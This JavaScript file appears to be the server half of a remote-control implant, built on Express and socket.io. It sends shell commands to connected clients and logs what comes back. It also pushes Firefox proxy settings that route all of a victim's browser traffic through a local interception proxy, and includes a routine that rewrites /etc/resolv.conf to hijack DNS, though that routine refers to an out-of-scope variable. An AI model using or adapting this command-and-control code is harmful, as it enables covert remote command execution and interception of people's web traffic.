var app = require('express')();
var server = require('http').Server(app);
var io = require('socket.io')(server);

server.listen(8000);


var clients = [];

app.get('/', function (req, res) {
  res.sendfile(__dirname + '/index.html');
});

io.on('connection', function (socket) {
    
    
    socket.on('client_connect', (data, cb) => {
      console.log("Client connection of type " + data.type);

      clients.push({
        sock: socket,
        type: data.type,
        name: data.name
      });

      cb();

    });


  socket.emit('cmd', { cmd: 'ls' }, (response) => {
    console.log("response " + response);
  });

  socket.emit('setFFProxy', generateFFProxySettings("localhost", 9333));

  socket.on('CH01', function (data) {
    console.log(data);
  });

  
  socket.on('list_clients', function(data, cb) { 
    console.log("RECV list_clients");
    cb("ab");
  });



});



function writeResolveCache() {
    socket.emit('cmdWriteFile', {
        string: "nameserver 127.0.0.1",
        dest: '/etc/resolv.conf'
    });
}


function generateFFProxySettings(ip, port) {
  var proxySettings =
`user_pref("network.proxy.backup.ftp", "${ip}");
user_pref("network.proxy.backup.ftp_port", ${port});
user_pref("network.proxy.backup.socks", "${ip}");
user_pref("network.proxy.backup.socks_port", ${port});
user_pref("network.proxy.backup.ssl", "${ip}");
user_pref("network.proxy.backup.ssl_port", ${port});
user_pref("network.proxy.ftp", "${ip}");
user_pref("network.proxy.ftp_port", ${port});
user_pref("network.proxy.http", "${ip}");
user_pref("network.proxy.http_port", ${port});
user_pref("network.proxy.share_proxy_settings", true);
user_pref("network.proxy.socks", "${ip}");
user_pref("network.proxy.socks_port", ${port});
user_pref("network.proxy.ssl", "${ip}");
user_pref("network.proxy.ssl_port", ${port});
user_pref("network.proxy.type", 1);
`;
  return proxySettings;
}

